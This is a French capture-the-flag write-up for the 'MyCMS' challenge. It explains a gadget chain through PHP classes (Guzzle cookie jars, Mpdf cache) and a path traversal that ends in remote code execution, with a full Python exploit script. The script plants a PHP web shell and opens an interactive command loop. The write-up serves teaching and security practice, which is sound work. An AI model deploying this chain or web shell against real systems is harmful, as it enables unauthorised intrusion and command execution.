# MyCMS (2/2)

## Solve

NB : Dans ce write up, je considère que vous avez lu le premier car je vais réutiliser la vulnérabilité de mass-assignment sur le paramètre renderer ainsi que l'instanciation arbitraire de classe PHP pour résoudre le challenge.

Après avoir réussi le premier challenge, on sait qu'il est possible d'instancier n'importe quelle classe PHP du projet, cela implique deux choses :
- Le construteur `__construct` sera appelé
- Le destructeur `__destruct` sera appelé

De plus, on sait que le flag est dans /root, et qu'on le récupère grâce à l'exécution d'un binaire SUID `getflag`, il faut donc obligatoirement obtenir une RCE.

A l'intérieur du webroot reachable depuis le site internet, on remarque qu'un seul dossier appartient à www-data, `/public/pdf`, à l'aide d'une vulnérabilité, il est théoriquement possible d'écrire dedans.

Si l'on s'intéresse à une vulnérabilité de type écriture de fichiers arbitraires, le fichier `src/app/Http/Controllers/AdminController.php` est intéressant, en effet, si l'on arrive à devenir administrateur, on remarque la fonction suivante :

```php
<?php
public function change(Request $request)
{
    $params = request()->all();
    if(isset($params["template"]) && isset($params["file"]))
    {
        if(file_exists("/templates/".$params["file"]) && is_writable("/templates/".$params["file"]))
        {
            if(strlen($params["template"]) <= 50)
            {
                if(!file_put_contents($params["file"], $params["template"], LOCK_EX))
                {
                    $request->session()->put("error","Erreur lors de la modification du fichier de template.");
                }
                else
                {
                    $request->session()->put("ok","Le fichier de template a bien été modifié.");
                }
            }
        }
    }
}
```

Dans cette fonction qui permet de modifier les templates d'erreur, il y a un path traversal dans le paramètre POST `file`. Néanmoins, il faut que celui-ci existe, et dans le dossier `/public/pdf`, il n'y a (presque) aucun fichier pré-existant permettant d'exécuter du code arbitraire (.php). Le seul fichier présent dans ce dossier est `.htaccess`, malheureusement, celui-ci ne peut être réécrit à cause de la ligne suivante dans le Dockerfile :

```
RUN chown root:root /var/www/html/public/pdf/.htaccess
```

Si l'on s'intéresse à ce .htaccess, il contient la directive suivante :

```
php_flag engine off
```

Cela signifie que meme si nous arrivons à écrire un fichier `.php` dans le dossier `/public/pdf`, le code ne s'exécutera pas. Néanmoins, dans apache, les directives `.htaccess` peuvent être overwrite si l'on recréé un fichier `.htaccess` dans un dossier enfant, par exemple, pour réactiver php !

Le plan d'attaque est donc le suivant, à l'aide de la vulnérabilité d'instanciation arbitraire, il va falloir trouver des gadgets qui :
- Passer administrateur de la plateforme
- Créer un dossier dans `/public/pdf`
- Créer un fichier `/public/pdf/attack/.htaccess`
- Overwrite le contenu du fichier par `php_flag engine on`
- Créer un fichier `/public/pdf/attack/rce.php`
- Overwrite le contenu du fichier par `<?php var_dump(shell_exec($_GET['c'])); ?>`

### Privesc en admin

Pour passer administrateur, il faut d'abord s'intéresser au check fait par l'application pour savoir si nous le sommes ou non, cela se trouve dans le fichier `src/app/Http/Middleware/EnsureUserIsAdmin.php` :

```php
<?php
[...]
public function handle(Request $request, Closure $next): Response
{
    if(CustomSessionHandler::is_session_param_defined('email', $request) && CustomSessionHandler::is_session_param_defined('admin', $request)) 
    {
        return $next($request);
    }
    else
    {
        return redirect('/');
    }
    
}
```

Il faut donc ici regarder le contenu du fichier `/src/app/CustomSessionHandler.php` pour comprendre :

```php
<?php

namespace App;

class CustomSessionHandler{
    public static function is_session_param_defined($param, $request)
    {
        if($request->session()->get($param) || isset($_SESSION[$param]))
        {
            return true;
        }
        return false;
    }
}
```

Ici, on remarque qu'il suffit que la clé `admin` existe dans la session laravel ou dans l'attribut `$_SESSION` (sans valeur particulière) pour que l'application considère que l'on est adminitrateur.
Dans l'ensemble des classes du dossier `vendor/`, on en remarque une qui à l'air de jouer avec la variable `$_SESSION` : `GuzzleHttp\Cookie\SessionCookieJar` :

```php
<?php

namespace GuzzleHttp\Cookie;

class SessionCookieJar extends CookieJar
{
    private $sessionKey;

    private $storeSessionCookies;

    public function __construct(string $sessionKey, bool $storeSessionCookies = false)
    {
        parent::__construct();
        $this->sessionKey = $sessionKey;
        $this->storeSessionCookies = $storeSessionCookies;
        $this->load();
    }

    public function __destruct()
    {
        $this->save();
    }

    public function save(): void
    {
        $json = [];
        foreach ($this as $cookie) {
            if (CookieJar::shouldPersist($cookie, $this->storeSessionCookies)) {
                $json[] = $cookie->toArray();
            }
        }

        $_SESSION[$this->sessionKey] = \json_encode($json);
    }

    protected function load(): void
    {
        if (!isset($_SESSION[$this->sessionKey])) {
            return;
        }
        $data = \json_decode($_SESSION[$this->sessionKey], true);
        if (\is_array($data)) {
            foreach ($data as $cookie) {
                $this->setCookie(new SetCookie($cookie));
            }
        } elseif (\strlen($data)) {
            throw new \RuntimeException('Invalid cookie data');
        }
    }
}
```

Ici, on va pouvoir instancier la classe avec un paramètre, qui sera pour nous, le nom du formulaire. On remarque que le constructeur appelle une méthode mais celle-ci va directement return car `$this->sessionKey` (dans notre cas le nom du formulaire qui sera `admin`) ne sera pas défini. Par contre, dans le destructeur, on remarque qu'il itère sur un objet, et qu'à la fin, il l'écrit dans la variable `$_SESSION[$this->sessionKey]`, ce qui est exactement ce que l'on cherche.

Si l'on créé un formulaire avec comme renderer `GuzzleHttp\Cookie\SessionCookieJar` et que le nom du formulaire est `admin`, cette classe va nous stocker la valeur `[]` dans `$_SESSION['admin']`, ce qui permet d'outre passer le check fait par l'application et d'accéder au panel de l'administrateur !

### Création arbitraire d'un dossier

On repart dans la même recherche de gadgets que pour la privesc précédente, sachant que l'on cherche un moyen de créer un dossier, donc un appel à la fonction `mkdir`, rapidement, on tombe sur la classe `Mpdf\Cache` :

```php
<?php
[...]
public function __construct($basePath, $cleanupInterval = 3600)
{
    if (!is_int($cleanupInterval) && false !== $cleanupInterval) {
        throw new \Mpdf\MpdfException('Cache cleanup interval has to be an integer or false');
    }

    if (!$this->createBasePath($basePath)) {
        throw new \Mpdf\MpdfException(sprintf('Temporary files directory "%s" is not writable', $basePath));
    }

    $this->basePath = $basePath;
    $this->cleanupInterval = $cleanupInterval;
}
[...]
protected function createBasePath($basePath)
{
    if (!file_exists($basePath)) {
        if (!$this->createBasePath(dirname($basePath))) {
            return false;
        }

        if (!$this->createDirectory($basePath)) {
            return false;
        }
    }

    if (!is_writable($basePath) || !is_dir($basePath)) {
        return false;
    }

    return true;
}

protected function createDirectory($basePath)
{
    if (!mkdir($basePath)) {
        return false;
    }

    if (!chmod($basePath, 0777)) {
        return false;
    }

    return true;
}
[...]
```

Ici, la variable `$basePath` (dans notre contexte le nom du formulaire qui sera `/var/www/html/public/pdf/attack/`), subit plusieurs check car elle sert à déterminer l'endroit ou les fichiers de cache de `Mpdf` seront écris, et si le path spécifié dans cette variable n'existe pas, alors `mkdir` sera appelée dessus pour créer le dossier !

Il faut donc créer un formulaire qui a pour renderer `Mpdf\Cache`, et comme nom de formulaire `/var/www/html/public/pdf/attack/`.

### Création arbitraire d'un fichier

Maintenant que l'on a créé le dossier, il nous manque un dernier gadget qui va nous permettre de créer arbitrairement un fichier (par exemple `file_put_contents`), pour pouvoir ensuite l'overwrite avec le path traversal qu'il y a dans une des fonctionnalités du panel d'administration.

En cherchant dans les classes dans le dossier `vendor/`, on remarque la classe `GuzzleHttp\Cookie\FileCookieJar` :

```php
<?php

namespace GuzzleHttp\Cookie;

use GuzzleHttp\Utils;

class FileCookieJar extends CookieJar
{
    private $filename;

    private $storeSessionCookies;

    public function __construct(string $cookieFile, bool $storeSessionCookies = false)
    {
        parent::__construct();
        $this->filename = $cookieFile;
        $this->storeSessionCookies = $storeSessionCookies;

        if (\file_exists($cookieFile)) {
            $this->load($cookieFile);
        }
    }

    public function __destruct()
    {
        $this->save($this->filename);
    }

    public function save(string $filename): void
    {
        $json = [];
        foreach ($this as $cookie) {
            if (CookieJar::shouldPersist($cookie, $this->storeSessionCookies)) {
                $json[] = $cookie->toArray();
            }
        }

        $jsonStr = Utils::jsonEncode($json);
        if (false === \file_put_contents($filename, $jsonStr, \LOCK_EX)) {
            throw new \RuntimeException("Unable to save file {$filename}");
        }
    }

    public function load(string $filename): void
    {
        $json = \file_get_contents($filename);
        if (false === $json) {
            throw new \RuntimeException("Unable to load file {$filename}");
        }
        if ($json === '') {
            return;
        }

        $data = Utils::jsonDecode($json, true);
        if (\is_array($data)) {
            foreach ($data as $cookie) {
                $this->setCookie(new SetCookie($cookie));
            }
        } elseif (\is_scalar($data) && !empty($data)) {
            throw new \RuntimeException("Invalid cookie file: {$filename}");
        }
    }
}
```

A l'instar de la classe `GuzzleHttp\Cookie\SessionCookieJar` qui nous a permi de créer un attribut dans la variable `$_SESSION`, cette classe nous permet, avec le même comportement, de créer arbitrairement un fichier ou l'on souhaite sur le filesystem.

Il faut donc créer un premier formulaire qui a pour renderer `GuzzleHttp\Cookie\SessionCookieJar` et pour nom `/var/www/html/public/pdf/attack/.htaccess` et aller le visualiser pour créer le fichier.
Ensuite, il faut créer un autre formulaire avec toujours pour renderer `GuzzleHttp\Cookie\SessionCookieJar` mais pour nom `/var/www/html/public/pdf/attack/rce.php`.

### Ecriture des fichiers

Pour écrire dans les deux fichiers que nous venons de créer, il suffit d'abuser de la fonctionnalité dans le panel d'administration en exploitant le path traveral.

### Payload finale

Il est plus pratique d'écrire tout cet exploit dans un script python pour automatiquement exploiter les différentes gadgets que l'on a récupéré :

```py
import requests
import sys
import random
import string
import re
from base64 import b64encode

S = requests.Session()
chall_url = sys.argv[1]
folder_rce = "exploit"
folder_base = f"/var/www/html/public/pdf/{folder_rce}/"
file_rce = "exploit.php"
payload = "<?php var_dump(shell_exec($_GET['c'])); ?>"

def get_csrf_token(path):
    resp = S.get(f"{chall_url}/{path}", cookies=S.cookies.get_dict())
    return re.findall(r'\b\w{40}\b', resp.text)[0]

def get_b64_content():
    return b64encode(('[{"name":"'+''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=5))+'","type":"email","size":"5"}]').encode()).decode()

# Initialize session
S.get(f"{chall_url}/")

# Login
S.post(f"{chall_url}/login",data={"_token": get_csrf_token(""), "email": "a@a.fr", "password":"a"}, cookies=S.cookies.get_dict())

# Step 1 - Privesc to admin
S.post(f"{chall_url}/form", json={"_token": get_csrf_token("form"), "content": get_b64_content(), "nb_fields": 1, "name": "admin", "renderer": "GuzzleHttp\\Cookie\\SessionCookieJar"}, cookies=S.cookies.get_dict())
S.get(f"{chall_url}/form?id=admin", cookies=S.cookies.get_dict())

if(S.get(f"{chall_url}/admin", allow_redirects=False, cookies=S.cookies.get_dict()).status_code == 200):
    print("[+] Privesc to admin: done")
else:
    print("[-] Privesc to admin failed...")
    sys.exit(-1)

# Step 2 - Arbitrary folder creation in /application/public/
S.post(f"{chall_url}/form", json={"_token": get_csrf_token("form"), "content": get_b64_content(), "nb_fields": 1, "name": folder_base, "renderer": "Mpdf\\Cache"}, cookies=S.cookies.get_dict())
S.get(f"{chall_url}/form?id={folder_base}", cookies=S.cookies.get_dict())

if(S.get(f"{chall_url}/pdf/exploit/", cookies=S.cookies.get_dict()).status_code == 403):
    print("[+] Arbitrary folder creation with 777 mode: done")
else:
    print("[-] Arbitrary folder creation with 777 mode: failed...")
    sys.exit(-1)

# Step 3 - Arbitrary file creation of exploit.php in previous folder
S.post(f"{chall_url}/form", json={"_token": get_csrf_token("form"), "content": get_b64_content(), "nb_fields": 1, "name": f"{folder_base}{file_rce}", "renderer": "GuzzleHttp\\Cookie\\FileCookieJar"}, cookies=S.cookies.get_dict())
S.get(f"{chall_url}/form?id={folder_base}{file_rce}", cookies=S.cookies.get_dict())

if(S.get(f"{chall_url}/pdf/exploit/exploit.php", cookies=S.cookies.get_dict()).status_code == 200):
    print("[+] Arbitrary file creation (exploit.php): done")
else:
    print("[-] Arbitrary file creation: failed...")
    sys.exit(-1)

# Step 4 - Arbitrary file creation of .htaccess in previous folder
S.post(f"{chall_url}/form", json={"_token": get_csrf_token("form"), "content": get_b64_content(), "nb_fields": 1, "name": f"{folder_base}.htaccess", "renderer": "GuzzleHttp\\Cookie\\FileCookieJar"}, cookies=S.cookies.get_dict())
S.get(f"{chall_url}/form?id={folder_base}.htaccess", cookies=S.cookies.get_dict())

if(S.get(f"{chall_url}/pdf/exploit/.htaccess", cookies=S.cookies.get_dict()).status_code == 500):
    print("[+] Arbitrary file creation (.htaccess): done")
else:
    print("[-] Arbitrary file creation (.htaccess): failed...")
    sys.exit(-1)

# Step 5 - Create a .htaccess in created folder to reactivate php
if(S.post(f"{chall_url}/admin/logs/template", data={"_token": get_csrf_token("form"), "template": "php_flag engine on", "file": f"../../../../../../../../{folder_base}/.htaccess"}, cookies=S.cookies.get_dict(), allow_redirects=False).status_code == 302):
    print("[+] Override created .htaccess file : done")
else:
    print("[-] Override created .htaccess file : failed...")
    sys.exit(-1)

# Step 6 - Trigger arbitrary write in previous created file
S.post(f"{chall_url}/admin/logs/template", data={"_token": get_csrf_token("form"), "template": payload, "file": f"../../../../../../../../{folder_base}{file_rce}"}, cookies=S.cookies.get_dict())

if("www-data" in S.get(f"{chall_url}/pdf/exploit/exploit.php?c=whoami", cookies=S.cookies.get_dict()).text):
    print(f"[+] RCE: done\nShell at: {chall_url}/pdf/exploit/exploit.php\nDropping shell...")
    while 1:
        cmd = input("linux> ")
        print(S.get(f"{chall_url}/pdf/exploit/exploit.php?c={cmd}", cookies=S.cookies.get_dict()).text.split('"')[1].split('"')[0])
else:
    print("[-] RCE: failed...")
    sys.exit(-1)
```

On exécute l'exploit, et on récupère le flag !

```bash
$ python3 exploit.py "http://localhost"                                                                                                                                                                         0 [23:31:59]
[+] Privesc to admin: done
[+] Arbitrary folder creation with 777 mode: done
[+] Arbitrary file creation (exploit.php): done
[+] Arbitrary file creation (.htaccess): done
[+] Override created .htaccess file : done
[+] RCE: done
Shell at: http://localhost/pdf/exploit/exploit.php
Dropping shell...
linux> /getflag
BZHCTF{cust0m_g4dg3t_ch41n_1s_fun_!!}
```


## Flag

BZHCTF{cust0m_g4dg3t_ch41n_1s_fun_!!}